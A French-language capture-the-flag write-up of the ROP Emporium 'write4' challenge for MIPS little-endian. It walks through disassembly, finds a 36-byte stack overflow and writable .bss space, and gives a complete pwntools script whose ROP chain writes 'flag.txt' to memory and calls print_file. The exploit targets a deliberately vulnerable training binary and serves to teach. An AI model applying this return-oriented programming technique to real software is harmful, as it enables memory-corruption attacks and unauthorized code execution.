---
Title: Ropemporium mipsel write4
Date: 2023-07-04
Tags: [linux, python, ROP, mipsel, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# write4 mipsel

## Introduction.

Le pitch de cet exercie se trouve sur cette page :

[write4](https://ropemporium.com/challenge/write4.html)

La fonction vulnérable se trouve dans la librairie qui contient aussi une fonction print_file qui dit nous permettre d'afficher le flag.

IL nous faut au préalable ecrire le nome du fichier ne mémoire

## Découverte

### Contenu du challenge

    -rw-r--r-- 1 jce jce   33  2 juil.  2020 flag.txt
    -rwxr-xr-x 1 jce jce 7532  8 juil.  2020 libwrite4_mipsel.so
    -rwxr-xr-x 1 jce jce 7948  8 juil.  2020 write4_mipsel

Le challenge contient juste 3 fichiers, le programe, sa librairie et le flag.txt qui doit être lu.

#### Execution avec qemu

    qemu-mipsel ./write4_mipsel
    write4 by ROP Emporium
    MIPS

    Go ahead and give me the input already!

    > OKOKOK
    Thank you!


## Analyse

### La programme principal

La fonction main du programme appelle la fonction vulnérable présente dans le librairie dynamique.

    ┌ 76: int main (int32_t argc);
    │           ; arg int32_t argc @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           0x00400890      e0ffbd27       addiu sp, sp, -0x20
    │           0x00400894      1c00bfaf       sw ra, (var_1ch)
    │           0x00400898      1800beaf       sw fp, (var_18h)
    │           0x0040089c      25f0a003       move fp, sp
    │           0x004008a0      42001c3c       lui gp, 0x42                ; 'B'
    │           0x004008a4      10909c27       addiu gp, gp, -0x6ff0
    │           0x004008a8      1000bcaf       sw gp, (var_10h)
    │           0x004008ac      5080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x411060:4]=0x400a70 sym.imp.pwnme
    │           0x004008b0      25c84000       move t9, v0
    │           0x004008b4      09f82003       jalr t9
    │           0x004008b8      00000000       nop
    │           0x004008bc      1000dc8f       lw gp, (var_10h)
    │           0x004008c0      25100000       move v0, zero
    │           0x004008c4      25e8c003       move sp, fp
    │           0x004008c8      1c00bf8f       lw ra, (var_1ch)
    │           0x004008cc      1800be8f       lw fp, (var_18h)
    │           0x004008d0      2000bd27       addiu sp, sp, 0x20
    │           0x004008d4      0800e003       jr ra

Un fonction inutilisée est présente. Elle appelle la fonction importée de la librairie print_file.
De ce fait cette fonction est accessible via la plt ou via l'adresse  0x00400900.

    ┌ 84: sym.usefulFunction (int32_t arg1, int32_t arg_10h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int32_t arg1 @ a0
    │           0x004008dc      e0ffbd27       addiu sp, sp, -0x20
    │           0x004008e0      1c00bfaf       sw ra, (var_1ch)
    │           0x004008e4      1800beaf       sw fp, (var_18h)
    │           0x004008e8      25f0a003       move fp, sp
    │           0x004008ec      42001c3c       lui gp, 0x42                ; 'B'
    │           0x004008f0      10909c27       addiu gp, gp, -0x6ff0
    │           0x004008f4      1000bcaf       sw gp, (var_10h)
    │           0x004008f8      4000023c       lui v0, 0x40                ; '@'
    │           0x004008fc      100b4424       addiu a0, v0, 0xb10         ; 0x400b10 ; "nonexistent" ; arg1 ; str.nonexistent
    │           0x00400900      4080828f       lw v0, -sym.imp.print_file(gp) ; [0x411050:4]=0x400a90 sym.imp.print_file
    │           0x00400904      25c84000       move t9, v0
    │           0x00400908      09f82003       jalr t9
    │           0x0040090c      00000000       nop
    │           0x00400910      1000dc8f       lw gp, (var_10h)
    │           0x00400914      00000000       nop
    │           0x00400918      25e8c003       move sp, fp
    │           0x0040091c      1c00bf8f       lw ra, (var_1ch)
    │           0x00400920      1800be8f       lw fp, (var_18h)
    │           0x00400924      2000bd27       addiu sp, sp, 0x20
    │           0x00400928      0800e003       jr ra
    └           0x0040092c      00000000       nop

Le programme embarque aussi des gadgets :

            ;-- usefulGadgets:
            0x00400930      0c00b98f       lw t9, 0xc(sp)
            0x00400934      0800a88f       lw t0, 8(sp)
            0x00400938      0400a98f       lw t1, 4(sp)
            0x0040093c      000009ad       sw t1, (t0)
            0x00400940      09f82003       jalr t9
            0x00400944      1000bd23       addi sp, sp, 0x10
            0x00400948      0800a48f       lw a0, 8(sp)
            0x0040094c      0400b98f       lw t9, 4(sp)
            0x00400950      09f82003       jalr t9

## La librairie libwrite4_mipsel.so.


La fonction vulnérable

    ┌ 316: sym.pwnme (int32_t arg1, int32_t arg3, int32_t arg_10h, int32_t arg_18h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_38h @ sp+0x38
    │           ; var int32_t var_3ch @ sp+0x3c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg3 @ a2
    │           0x00000860      02001c3c       lui gp, 2
    │           0x00000864      90879c27       addiu gp, gp, -0x7870
    │           0x00000868      21e09903       addu gp, gp, t9
    │           0x0000086c      c0ffbd27       addiu sp, sp, -0x40
    │           0x00000870      3c00bfaf       sw ra, (var_3ch)
    │           0x00000874      3800beaf       sw fp, (var_38h)
    │           0x00000878      25f0a003       move fp, sp
    │           0x0000087c      1000bcaf       sw gp, (var_10h)
    │           0x00000880      4080828f       lw v0, -0x7fc0(gp)          ; [0x11030:4]=0
    │           0x00000884      0000428c       lw v0, (v0)
    │           0x00000888      25380000       move a3, zero
    │           0x0000088c      02000624       addiu a2, zero, 2           ; arg3
    │           0x00000890      25280000       move a1, zero
    │           0x00000894      25204000       move a0, v0
    │           0x00000898      4880828f       lw v0, -sym.imp.setvbuf(gp) ; [0x11038:4]=0xb60 sym.imp.setvbuf
    │           0x0000089c      25c84000       move t9, v0
    │           0x000008a0      09f82003       jalr t9
    │           0x000008a4      00000000       nop
    │           0x000008a8      1000dc8f       lw gp, (var_10h)
    │           0x000008ac      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x000008b0      f00b4424       addiu a0, v0, str.write4_by_ROP_Emporium ; 0xbf0 ; "write4 by ROP Emporium" ; arg1
    │           0x000008b4      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x000008b8      25c84000       move t9, v0
    │           0x000008bc      09f82003       jalr t9
    │           0x000008c0      00000000       nop
    │           0x000008c4      1000dc8f       lw gp, (var_10h)
    │           0x000008c8      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x000008cc      080c4424       addiu a0, v0, str.MIPS_n    ; 0xc08 ; "MIPS\n" ; arg1
    │           0x000008d0      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x000008d4      25c84000       move t9, v0
    │           0x000008d8      09f82003       jalr t9
    │           0x000008dc      00000000       nop
    │           0x000008e0      1000dc8f       lw gp, (var_10h)
    │           0x000008e4      20000624       addiu a2, zero, 0x20        ; arg3
    │           0x000008e8      25280000       move a1, zero
    │           0x000008ec      1800c227       addiu v0, fp, 0x18
    │           0x000008f0      25204000       move a0, v0
    │           0x000008f4      4480828f       lw v0, -sym.imp.memset(gp)  ; [0x11034:4]=0xb70 sym.imp.memset
    │           0x000008f8      25c84000       move t9, v0
    │           0x000008fc      09f82003       jalr t9
    │           0x00000900      00000000       nop
    │           0x00000904      1000dc8f       lw gp, (var_10h)
    │           0x00000908      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x0000090c      100c4424       addiu a0, v0, str.Go_ahead_and_give_me_the_input_already__n
    │           0x00000910      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x00000914      25c84000       move t9, v0
    │           0x00000918      09f82003       jalr t9
    │           0x0000091c      00000000       nop
    │           0x00000920      1000dc8f       lw gp, (var_10h)
    │           0x00000924      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x00000928      3c0c4424       addiu a0, v0, 0xc3c         ; arg1
    │           0x0000092c      6080828f       lw v0, -sym.imp.printf(gp)  ; [0x11050:4]=0xb10 sym.imp.printf
    │           0x00000930      25c84000       move t9, v0
    │           0x00000934      09f82003       jalr t9
    │           0x00000938      00000000       nop
    │           0x0000093c      1000dc8f       lw gp, (var_10h)
    │           0x00000940      00020624       addiu a2, zero, 0x200       ; arg3
    │           0x00000944      1800c227       addiu v0, fp, 0x18
    │           0x00000948      25284000       move a1, v0
    │           0x0000094c      25200000       move a0, zero
    │           0x00000950      6880828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x11058:4]=0xb00 sym.imp.read
    │           0x00000954      25c84000       move t9, v0
    │           0x00000958      09f82003       jalr t9
    │           0x0000095c      00000000       nop
    │           0x00000960      1000dc8f       lw gp, (var_10h)
    │           0x00000964      2880828f       lw v0, -0x7fd8(gp)          ; [0x11018:4]=0
    │           0x00000968      400c4424       addiu a0, v0, str.Thank_you_ ; 0xc40 ; "Thank you!"
    │           0x0000096c      5480828f       lw v0, -sym.imp.puts(gp)    ; [0x11044:4]=0xb40 sym.imp.puts
    │           0x00000970      25c84000       move t9, v0
    │           0x00000974      09f82003       jalr t9
    │           0x00000978      00000000       nop
    │           0x0000097c      1000dc8f       lw gp, (var_10h)
    │           0x00000980      00000000       nop
    │           0x00000984      25e8c003       move sp, fp
    │           0x00000988      3c00bf8f       lw ra, (var_3ch)
    │           0x0000098c      3800be8f       lw fp, (var_38h)
    │           0x00000990      4000bd27       addiu sp, sp, 0x40
    │           0x00000994      0800e003       jr ra
    └           0x00000998      00000000       nop

Comme d'habitude on s'intéresse a l'operation de lecture du message :

On lit 512 caracteres

        │           0x00000940      00020624       addiu a2, zero, 0x200       ; arg3

A partir de l'adresse `fp+0x18`

        │           0x00000944      1800c227       addiu v0, fp, 0x18
        │           0x00000948      25284000       move a1, v0
        │           0x0000094c      25200000       move a0, zero
        │           0x00000950      6880828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x11058:4]=0xb00 sym.imp.read
        │           0x00000954      25c84000       move t9, v0
        │           0x00000958      09f82003       jalr t9
        │           0x0000095c      00000000       nop

Dans le prologue, au la création d'une pile locale de 0x40 (64) octets et fp point le sommet de la pile.

        │           0x0000086c      c0ffbd27       addiu sp, sp, -0x40
        │           0x00000870      3c00bfaf       sw ra, (var_3ch)
        │           0x00000874      3800beaf       sw fp, (var_38h)
        │           0x00000878      25f0a003       move fp, sp
ET la sauvegarde de l'adresse de retour en sp+0x3c
        │           0x00000870      3c00bfaf       sw ra, (var_3ch)
        │           0x00000874      3800beaf       sw fp, (var_38h)
Le buffer fp+0x18 se trouve à 0x3c - 0x18 = 0x24 la sauvegarde de ra.

L'offset de débordement de notre message est donc de 0x24 (36) octets.

## Contruction de l'attaque

### Recherche d'une zone mémoire inscriptible

On affiche la lsite des sectiona avec radare2 ainsi

    [0x00000860]> iS
    [Sections]

    nth paddr        size vaddr       vsize perm name
    ―――――――――――――――――――――――――――――――――――――――――――――――――
    0   0x00000000    0x0 0x00000000    0x0 ----
    1   0x00000138   0x18 0x00000138   0x18 -r-- .MIPS.abiflags
    2   0x00000150   0x18 0x00000150   0x18 -r-- .reginfo
    3   0x00000168   0x24 0x00000168   0x24 -r-- .note.gnu.build-id
    4   0x0000018c   0xe0 0x0000018c   0xe0 -r-- .dynamic
    5   0x0000026c   0xb8 0x0000026c   0xb8 -r-- .hash
    6   0x00000324  0x1b0 0x00000324  0x1b0 -r-- .dynsym
    7   0x000004d4  0x104 0x000004d4  0x104 -r-- .dynstr
    8   0x000005d8   0x36 0x000005d8   0x36 -r-- .gnu.version
    9   0x00000610   0x30 0x00000610   0x30 -r-- .gnu.version_r
    10  0x00000640   0x10 0x00000640   0x10 -r-- .rel.dyn
    11  0x00000650   0x84 0x00000650   0x84 -r-x .init
    12  0x000006e0  0x420 0x000006e0  0x420 -r-x .text
    13  0x00000b00   0xa0 0x00000b00   0xa0 -r-x .MIPS.stubs
    14  0x00000ba0   0x48 0x00000ba0   0x48 -r-x .fini
    15  0x00000bf0   0x80 0x00000bf0   0x80 -r-- .rodata
    16  0x00000c70    0x4 0x00000c70    0x4 -r-- .eh_frame
    17  0x00000ff0    0x8 0x00010ff0    0x8 -rw- .ctors
    18  0x00000ff8    0x8 0x00010ff8    0x8 -rw- .dtors
    19  0x00001000   0x60 0x00011000   0x60 -rw- .got
    20  0x00001060    0x4 0x00011060    0x4 -rw- .sdata
    21  0x00001064    0x0 0x00011070   0x10 -rw- .bss       <== ici
    22  0x00001064   0x29 0x00000000   0x29 ---- .comment
    23  0x00001090   0x40 0x00000000   0x40 ---- .pdr
    24  0x000010d0   0x10 0x00000000   0x10 ---- .gnu.attributes
    25  0x000010e0    0x0 0x00000000    0x0 ---- .mdebug.abi32
    26  0x000010e0  0x490 0x00000000  0x490 ---- .symtab
    27  0x00001570  0x26d 0x00000000  0x26d ---- .strtab
    28  0x000017dd  0x105 0x00000000  0x105 ---- .shstrtab

On retient la section section bss de taille 16.

## Construction de la chaine de ROP

### Recherche d'un gadget d'ecriture

En recherchant un gadget avec l'instruction sw :

    ROPgadget --binary write4_mipsel --depth 5|grep sw
    ...
    0x00400930 :
On retrouve le gadget présent dans la référence `usefulGadget`.

Le gadget permet

- lw t9, 0xc(sp)    de charger t9 en vu du jump en fin de gadget
- lw t0, 8(sp)      de charger une adresse cible dans `t0`
- lw t1, 4(sp)      de charger une valeur dans `t1`
- sw t1, (t0)       d'ecrire cette valeur dans `t0`
- jalr t9           enfin d'appeller l'adresse chargée dans `t9`
- addi sp, sp, 0x10   en incrémentant la pile de 16 donc 4 mots.

### Recherche d'ungadget de chargement a0

On peut recherche un gadget lw (load word).

    # ROPgadget --binary write4_mipsel --depth 5|grep "lw \$a0"
    0x00400944 : addi $sp, $sp, 0x10 ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400940 : jalr $t9 ; addi $sp, $sp, 0x10 ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400948 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop

Et on trouve celui de la référence `usefulGadget`

### La chaine de ROP

Nous avons besoin de l'adresse de print_file dans la PLT

    # readelf --dyn-syms write4_mipsel |grep print_file
    16: 00400a90     0 FUNC    GLOBAL DEFAULT  UND print_file

La chaine est constituée de trois étape

- ecriture de "flag" dans .bss
- ecriture de ".txt" dans .bss+4
- appel de printf(@bss)


| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| | | Ecriture de flag dans .bss
| 0x00400930 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10 |
| 0xdeadbeef | | junk |
| 0x67616c66 | 'flag' | pour `t1
| 0x00001064 | @.bss | pour `t0`
| 0x00400930 | lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10  | Pour `t9` en vue d'ecrire la seconde partie
| | | Ecriture de ".txt"" dans .bss+4
| 0xdeadbeef | | junk |
| 0x7478742e | '.txt' | pour `t1`
| 0x00001064 | @.bss+4 | pour `t0`
| 0x00400948 | lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop | Pour `t9`
| | | Appel print_file(@.bss)
| 0xdeadbeef | | junk |
| 0x00400a90 | print_file@plt | pour `t9`
| 0x00001064 | @.bss | pour `a0`

## Exploitation

### Script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


# ROPemporium write4 MIPSEL

# Set up pwntools for the correct architecture
elf = context.binary = ELF('write4_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+296
c
'''

# Gadgets
# lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
g_write = 0x00400930

# lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
g_set_a0_and_call = 0x00400948

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


print_file = elf.plt["print_file"]
bssaddr = elf.get_section_by_name('.bss').header['sh_addr']

log.info(f"{bssaddr=:x}")
log.info(f"{print_file=:x}")

offset=0x24

PL=b"A"*offset
# first gadget write "flag"
PL+=p32(g_write)
PL+=p32(0xdeadbeef)        # junk
PL+=b'flag'                # t1
PL+=p32(bssaddr)           # t0
PL+=p32(g_write)           # t9 => next gadget

# Second gadget write ".txt"
PL+=p32(0xf00df00d) 	   # junk
PL+=b'.txt'                # t1
PL+=p32(bssaddr+4)         # t0
PL+=p32(g_set_a0_and_call) # t9 => next gadget

# call print_file(@.bss)
PL+=p32(0xdeadbeef)        # junk
PL+=p32(print_file)         # t9
PL+=p32(bssaddr)            # a0

io.sendlineafter(b"> ",PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()
```
